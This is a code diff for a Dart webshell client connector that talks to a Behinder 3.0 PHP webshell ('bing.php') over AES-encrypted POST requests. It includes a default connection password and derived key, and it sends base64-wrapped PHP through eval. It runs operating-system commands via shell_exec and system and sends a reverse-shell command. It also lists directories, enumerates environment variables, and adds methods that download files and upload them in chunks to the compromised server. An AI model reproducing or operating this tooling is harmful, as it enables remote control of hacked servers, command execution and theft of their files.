@@ -11,9 +11,9 @@ import '../models/file_entry.dart';
 import '../utils/encoding_utils.dart';
 import 'shell_connector.dart';
 
-  /// `bing.php`：冰蝎 3.0 PHP 协议，AES 加密传输
+/// `bing.php`：冰蝎 3.0 PHP 协议，AES 加密传输
 ///
-  /// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
+/// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
 /// POST body = base64(AES_encrypt("C|php_code"))，解密后 explode('|') 取 params，eval 执行
 class PhpBehinderConnector extends ShellConnector {
   PhpBehinderConnector(super.webshell);
@@ -47,11 +47,11 @@ class PhpBehinderConnector extends ShellConnector {
 
   @override
   Set<ConnectorCapability> get capabilities => const {
-        ConnectorCapability.codeExec,
-        ConnectorCapability.shellExec,
-        ConnectorCapability.fileRead,
-        ConnectorCapability.fileWrite,
-      };
+    ConnectorCapability.codeExec,
+    ConnectorCapability.shellExec,
+    ConnectorCapability.fileRead,
+    ConnectorCapability.fileWrite,
+  };
 
   /// 当前使用的模式：ECB 或 CBC。部分环境 "AES128" 映射不同，连接后自动探测
   bool _useCbc = false;
@@ -78,13 +78,16 @@ class PhpBehinderConnector extends ShellConnector {
     if (raw == null) return;
     final part = raw.split(';').first.trim();
     final eq = part.indexOf('=');
-    if (eq > 0) _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
+    if (eq > 0)
+      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
   }
 
   Map<String, String> _requestHeaders() {
     final h = <String, String>{'Content-Type': 'application/octet-stream'};
     if (_cookies.isNotEmpty) {
-      h['Cookie'] = _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+      h['Cookie'] = _cookies.entries
+          .map((e) => '${e.key}=${e.value}')
+          .join('; ');
     }
     return h;
   }
@@ -95,17 +98,14 @@ class PhpBehinderConnector extends ShellConnector {
       // 目标 bing.php 使用 explode('|') 来分离类名和参数。
       // 如果 phpCode 中包含 '|'，代码会被截断导致 eval 失败。
       // 因此必须用 base64 将代码包装一层，确保传输层没有 '|' 字符。
-      final safeCode = "eval(base64_decode('${base64.encode(utf8.encode(phpCode))}'));";
+      final safeCode =
+          "eval(base64_decode('${base64.encode(utf8.encode(phpCode))}'));";
       final payload = 'C|$safeCode';
       final body = _aesEncryptBase64(payload);
 
       // 勿用 application/x-www-form-urlencoded：base64 含 + 会被解码为空格导致损坏
       final response = await _client
-          .post(
-            Uri.parse(webshell.url),
-            headers: _requestHeaders(),
-            body: body,
-          )
+          .post(Uri.parse(webshell.url), headers: _requestHeaders(), body: body)
           .timeout(const Duration(seconds: 15));
 
       _updateCookies(response);
@@ -113,7 +113,9 @@ class PhpBehinderConnector extends ShellConnector {
         return decodeWithFallback(response.bodyBytes);
       }
       final respBody = decodeWithFallback(response.bodyBytes);
-      final snippet = respBody.length > 4096 ? '${respBody.substring(0, 4096)}...' : respBody;
+      final snippet = respBody.length > 4096
+          ? '${respBody.substring(0, 4096)}...'
+          : respBody;
       return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
     } on TimeoutException {
       return '[Timeout] 连接超时';
@@ -128,13 +130,17 @@ class PhpBehinderConnector extends ShellConnector {
   Future<bool> ping() async {
     try {
       _useCbc = false;
-      var r = await _sendPhp("echo 'MATRIX_PHP_PING';").timeout(const Duration(seconds: 8));
+      var r = await _sendPhp(
+        "echo 'MATRIX_PHP_PING';",
+      ).timeout(const Duration(seconds: 8));
       if (r.contains('MATRIX_PHP_PING')) {
         _lastPingDiagnostic = null;
         return true;
       }
       _useCbc = true;
-      r = await _sendPhp("echo 'MATRIX_PHP_PING';").timeout(const Duration(seconds: 8));
+      r = await _sendPhp(
+        "echo 'MATRIX_PHP_PING';",
+      ).timeout(const Duration(seconds: 8));
       _lastPingDiagnostic = r.contains('MATRIX_PHP_PING') ? null : r;
       return r.contains('MATRIX_PHP_PING');
     } catch (e) {
@@ -152,7 +158,8 @@ class PhpBehinderConnector extends ShellConnector {
         : '';
     final b64 = base64.encode(utf8.encode('$cd$cmd'));
     // 与 php_eval 完全一致，raw string 中 $ 不转义（Dart 仅 ${} 会插值）
-    final code = "\$c=base64_decode('$b64');"
+    final code =
+        "\$c=base64_decode('$b64');"
         r"$o=@shell_exec($c.' 2>&1');"
         r"if($o===null){$o=@system($c);}echo $o;";
     final r = await _sendPhp(code);
@@ -194,7 +201,8 @@ class PhpBehinderConnector extends ShellConnector {
     }
 
     final b64 = base64.encode(utf8.encode(rsCmd));
-    final php = "\$c=base64_decode('$b64');"
+    final php =
+        "\$c=base64_decode('$b64');"
         r"@system($c);";
     await _sendPhp(php);
   }
@@ -210,7 +218,8 @@ class PhpBehinderConnector extends ShellConnector {
   Future<List<FileEntry>> listDirectory(String path) async {
     final b64 = base64.encode(utf8.encode(path));
     // 1) 优先 opendir/readdir；若被 disable_functions 限制则回退到 shell_exec
-    final code = "\$p=base64_decode('$b64');"
+    final code =
+        "\$p=base64_decode('$b64');"
         "\$d=@opendir(\$p);"
         'if(\$d===false){'
         "  \$out=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),\$p).chr(34):'ls -1a '.escapeshellarg(\$p).' 2>/dev/null'));"
@@ -299,6 +308,64 @@ class PhpBehinderConnector extends ShellConnector {
   }
 
   @override
+  Future<Uint8List> readFileBinary(String path) async {
+    final b64path = base64.encode(utf8.encode(path));
+    final result = await _sendPhp(
+      "\$p=base64_decode('$b64path');"
+      r"if(!file_exists($p)){echo 'ERR_NOT_FOUND';exit;}"
+      r"echo base64_encode(file_get_contents($p));",
+    );
+    final trimmed = result.trim();
+    if (trimmed.startsWith('[') || trimmed == 'ERR_NOT_FOUND') {
+      throw Exception('无法读取文件: $trimmed');
+    }
+    return base64.decode(trimmed);
+  }
+
+  @override
+  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
+    final pathB64 = base64.encode(utf8.encode(path));
+    final contentB64 = base64.encode(bytes);
+    final r = await _sendPhp(
+      "\$p=base64_decode('$pathB64');"
+      "\$c=base64_decode('$contentB64');"
+      r"echo file_put_contents($p,$c)!==false?'1':'0';",
+    );
+    return r.trim() == '1';
+  }
+
+  static const _kChunkSize = 128 * 1024; // 128 KB per chunk
+
+  @override
+  Future<bool> writeFileBinaryWithProgress(
+    String path,
+    Uint8List bytes,
+    void Function(int sent, int total) onProgress,
+  ) async {
+    final total = bytes.length;
+    final pathB64 = base64.encode(utf8.encode(path));
+    onProgress(0, total);
+
+    int offset = 0;
+    bool first = true;
+    while (offset < total) {
+      final end = (offset + _kChunkSize).clamp(0, total);
+      final chunkB64 = base64.encode(bytes.sublist(offset, end));
+      final append = first ? '' : r',FILE_APPEND';
+      final r = await _sendPhp(
+        "\$p=base64_decode('$pathB64');"
+        "\$c=base64_decode('$chunkB64');"
+        "echo file_put_contents(\$p,\$c$append)!==false?'1':'0';",
+      );
+      if (r.trim() != '1') return false;
+      offset = end;
+      first = false;
+      onProgress(offset, total);
+    }
+    return true;
+  }
+
+  @override
   Future<bool> deleteFile(String path) async {
     final b64 = base64.encode(utf8.encode(path));
     final r = await _sendPhp(
@@ -342,10 +409,12 @@ foreach($info as $k=>$v){
       final idx = line.indexOf('|');
       if (idx > 0) {
         try {
-          final key =
-              decodeWithFallback(base64.decode(line.substring(0, idx).trim()));
-          final val =
-              decodeWithFallback(base64.decode(line.substring(idx + 1).trim()));
+          final key = decodeWithFallback(
+            base64.decode(line.substring(0, idx).trim()),
+          );
+          final val = decodeWithFallback(
+            base64.decode(line.substring(idx + 1).trim()),
+          );
           map[key] = val;
         } catch (_) {}
       }
@@ -355,9 +424,11 @@ foreach($info as $k=>$v){
 
   @override
   Future<List<({String name, bool isDir})>> listNamesForCompletion(
-      String path) async {
+    String path,
+  ) async {
     final b64 = base64.encode(utf8.encode(path));
-    final code = "\$p=base64_decode('$b64');"
+    final code =
+        "\$p=base64_decode('$b64');"
         r"\$d=@opendir(\$p);"
         r"if(\$d===false){"
         r"\$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),\$p).chr(34):'ls -1a '.escapeshellarg(\$p).' 2>/dev/null'));"
@@ -390,7 +461,8 @@ foreach($info as $k=>$v){
   @override
   Future<List<String>> listEnvVarNames() async {
     final result = await _sendPhp(
-        r"foreach(array_keys((array)getenv()) as \$k){echo \$k.chr(10);}");
+      r"foreach(array_keys((array)getenv()) as \$k){echo \$k.chr(10);}",
+    );
     if (result.isEmpty || result.startsWith('[')) return [];
     return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
       ..sort();
